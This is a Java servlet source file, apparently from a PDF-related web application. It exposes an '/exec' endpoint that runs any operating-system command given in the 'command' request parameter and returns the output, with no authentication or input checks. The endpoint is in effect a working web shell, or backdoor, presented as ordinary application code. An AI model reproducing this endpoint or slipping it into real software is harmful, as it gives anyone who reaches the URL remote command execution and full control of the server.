package ro.adma.pdf;

import ro.appenigne.web.framework.annotation.UrlPattern;
import ro.appenigne.web.framework.request.TrimRequest;
import ro.appenigne.web.framework.utils.Log;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

@UrlPattern("/exec")
public class Exec extends HttpServlet {

    /**
     * Processes requests for both HTTP
     * <code>GET</code> and
     * <code>POST</code> methods.
     *
     * @param request  servlet request
     * @param response servlet response
     * @throws javax.servlet.ServletException if a servlet-specific error occurs
     * @throws java.io.IOException            if an I/O error occurs
     */
    protected void processRequest(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String cmd = request.getParameter("command");
        if (cmd == null || cmd.isEmpty()) {
            return;
        }
        response.getWriter().print(exec(cmd));
        response.getWriter().flush(); // this is required since there is a bug in the VM. It will be fixed in the future
    }

    public static String exec(String command) {
        try {
            Process p1 = Runtime.getRuntime().exec(command);
            p1.waitFor();
            BufferedReader reader =
                    new BufferedReader(new InputStreamReader(p1.getInputStream()));
            StringBuilder sb = new StringBuilder();
            StringBuilder sb2 = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                sb.append(line).append("\n");
            }
            reader = new BufferedReader(new InputStreamReader(p1.getErrorStream()));

            while ((line = reader.readLine()) != null) {
                sb2.append(line).append("\n");
            }
            return sb.toString() + sb2.toString();
        } catch (IOException | InterruptedException e) {
            Log.w(e);
            return e.getMessage();
        }

    }

    // <editor-fold defaultstate="collapsed" desc="HttpServlet methods.">

    /**
     * Handles the HTTP
     * <code>GET</code> method.
     *
     * @param request  servlet request
     * @param response servlet response
     * @throws javax.servlet.ServletException if a servlet-specific error occurs
     * @throws java.io.IOException            if an I/O error occurs
     */
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        processRequest(new TrimRequest(request), response);
    }

    /**
     * Handles the HTTP
     * <code>POST</code> method.
     *
     * @param request  servlet request
     * @param response servlet response
     * @throws javax.servlet.ServletException if a servlet-specific error occurs
     * @throws java.io.IOException            if an I/O error occurs
     */
    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        processRequest(new TrimRequest(request), response);
    }

    /**
     * Returns a short description of the servlet.
     *
     * @return a String containing servlet description
     */
    @Override
    public String getServletInfo() {
        return "Short description";
    }// </editor-fold>
}